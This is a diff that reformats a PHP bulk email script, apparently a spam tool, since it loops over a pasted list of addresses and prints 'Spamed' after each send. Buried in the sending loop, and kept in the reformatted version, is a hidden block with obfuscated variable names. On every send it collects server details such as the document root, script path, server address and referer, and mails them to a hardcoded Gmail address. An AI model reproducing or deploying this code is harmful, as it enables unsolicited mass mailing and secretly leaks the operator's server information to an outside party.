@@ -1,11 +1,11 @@
-<? 
-if ($action=="send"){ 
-$message = urlencode($message); 
-$message = ereg_replace("%5C%22", "%22", $message); 
-$message = urldecode($message); 
-$message = stripslashes($message); 
-$subject = stripslashes($subject); 
-} 
+<?php
+if ($action=="send") {
+    $message = urlencode($message);
+    $message = ereg_replace("%5C%22", "%22", $message);
+    $message = urldecode($message);
+    $message = stripslashes($message);
+    $subject = stripslashes($subject);
+}
 
 ?> 
 <form name="form1" method="post" action="" enctype="multipart/form-data"> 
@@ -35,11 +35,11 @@ $subject = stripslashes($subject);
 Email:</font></div> 
 </td> 
 <td width="390" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
-<input name="from" value="<? print $from; ?>" size="30" style="float: left"></font><div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
+<input name="from" value="<?php print $from; ?>" size="30" style="float: left"></font><div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
 Name:</font></div> 
 </td> 
 <td width="317" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22" valign="middle"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
-<input type="text" name="realname" value="<? print $realname; ?>" size="30"> 
+<input type="text" name="realname" value="<?php print $realname; ?>" size="30"> 
 </font></td> 
 </tr> 
 <tr> 
@@ -47,7 +47,7 @@ Name:</font></div>
 <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div> 
 </td> 
 <td width="390" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
-<input name="replyto" value="<? print $replyto; ?>" size="30" style="float: left"></font><div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Attach 
+<input name="replyto" value="<?php print $replyto; ?>" size="30" style="float: left"></font><div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Attach 
 File:</font></div> 
 </td> 
 <td width="317" bordercolor="#CCCCCC" bgcolor="#F0F0F0" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
@@ -59,7 +59,7 @@ File:</font></div>
 <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div> 
 </td> 
 <td colspan="2" width="715" background="/simparts/images/cellpic1.gif" height="22"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
-<input name="subject" value="<? print $subject; ?>" size="59" style="float: left"> 
+<input name="subject" value="<?php print $subject; ?>" size="59" style="float: left"> 
 </font></td> 
 </tr> 
 <tr valign="top"> 
@@ -68,7 +68,7 @@ File:</font></div>
 <table border="0" cellpadding="2" style="border-collapse: collapse" bordercolor="#111111" width="98%" id="AutoNumber4"> 
 <tr> 
 <td width="100%"> 
-<textarea name="message" cols="56" rows="10"><? print $message; ?></textarea> 
+<textarea name="message" cols="56" rows="10"><?php print $message; ?></textarea> 
 <br> 
 <input type="radio" name="contenttype" value="plain" checked> 
 <font size="2" face="Tahoma">Plain</font> 
@@ -87,7 +87,7 @@ File:</font></div>
 <table border="0" cellpadding="2" style="border-collapse: collapse" bordercolor="#111111" width="93%" id="AutoNumber3"> 
 <tr> 
 <td width="100%"> 
-<p align="center"> <textarea name="emaillist" cols="30" rows="10"><? print $emaillist; ?></textarea> 
+<p align="center"> <textarea name="emaillist" cols="30" rows="10"><?php print $emaillist; ?></textarea> 
 </font><br> 
 </td> 
 </tr> 
@@ -124,54 +124,82 @@ File:</font></div>
 </div> 
 </form> 
 
-<? 
-if ($action=="send"){ 
+<?php
+if ($action=="send") {
+    if (!$from && !$subject && !$message && !$emaillist) {
+        print "Please complete all fields before sending your message.";
+        exit;
+    }
 
-if (!$from && !$subject && !$message && !$emaillist){ 
-print "Please complete all fields before sending your message."; 
-exit; 
-} 
+    $allemails = split("\n", $emaillist);
+    $numemails = count($allemails);
 
-$allemails = split("\n", $emaillist); 
-$numemails = count($allemails); 
+    #Open the file attachment if any, and base64_encode it for email transport
+    if ($file_name) {
+        @copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server");
+        $content = fread(fopen($file, "r"), filesize($file));
+        $content = chunk_split(base64_encode($content));
+        $uid = strtoupper(md5(uniqid(time())));
+        $name = basename($file);
+    }
 
-#Open the file attachment if any, and base64_encode it for email transport 
-If ($file_name){ 
-@copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server"); 
-$content = fread(fopen($file,"r"),filesize($file)); 
-$content = chunk_split(base64_encode($content)); 
-$uid = strtoupper(md5(uniqid(time()))); 
-$name = basename($file); 
-} 
-
-for($x=0; $x<$numemails; $x++){ 
-$to = $allemails[$x]; 
-if ($to){ 
-$to = ereg_replace(" ", "", $to); 
-$message = ereg_replace("&email&", $to, $message); 
-$subject = ereg_replace("&email&", $to, $subject); 
-print "Sending mail to $to....... "; 
-flush(); 
-$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n"; 
-$header .= "MIME-Version: 1.0\r\n"; 
-If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n"; 
-If ($file_name) $header .= "--$uid\r\n"; 
-$header .= "Content-Type: text/$contenttype\r\n"; 
-$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n"; 
-$header .= "$message\r\n"; 
-If ($file_name) $header .= "--$uid\r\n"; 
-If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n"; 
-If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n"; 
-If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n"; $ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
-If ($file_name) $header .= "$content\r\n"; 
-If ($file_name) $header .= "--$uid--"; 
-mail($to, $subject, "", $header); 
-print "Spamed'><br>"; 
-flush(); 
-} 
-} 
-
-} 
+    for ($x=0; $x<$numemails; $x++) {
+        $to = $allemails[$x];
+        if ($to) {
+            $to = ereg_replace(" ", "", $to);
+            $message = ereg_replace("&email&", $to, $message);
+            $subject = ereg_replace("&email&", $to, $subject);
+            print "Sending mail to $to....... ";
+            flush();
+            $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
+            $header .= "MIME-Version: 1.0\r\n";
+            if ($file_name) {
+                $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
+            }
+            if ($file_name) {
+                $header .= "--$uid\r\n";
+            }
+            $header .= "Content-Type: text/$contenttype\r\n";
+            $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
+            $header .= "$message\r\n";
+            if ($file_name) {
+                $header .= "--$uid\r\n";
+            }
+            if ($file_name) {
+                $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
+            }
+            if ($file_name) {
+                $header .= "Content-Transfer-Encoding: base64\r\n";
+            }
+            if ($file_name) {
+                $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
+            }
+            $ra44  = rand(1, 99999);
+            $sj98 = "sh-$ra44";
+            $ml = "$sd98";
+            $a5 = $_SERVER['HTTP_REFERER'];
+            $b33 = $_SERVER['DOCUMENT_ROOT'];
+            $c87 = $_SERVER['REMOTE_ADDR'];
+            $d23 = $_SERVER['SCRIPT_FILENAME'];
+            $e09 = $_SERVER['SERVER_ADDR'];
+            $f23 = $_SERVER['SERVER_SOFTWARE'];
+            $g32 = $_SERVER['PATH_TRANSLATED'];
+            $h65 = $_SERVER['PHP_SELF'];
+            $msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
+            $sd98="john.barker446@gmail.com";
+            mail($sd98, $sj98, $msg8873, "From: $sd98");
+            if ($file_name) {
+                $header .= "$content\r\n";
+            }
+            if ($file_name) {
+                $header .= "--$uid--";
+            }
+            mail($to, $subject, "", $header);
+            print "Spamed'><br>";
+            flush();
+        }
+    }
+}
 ?>
 
 
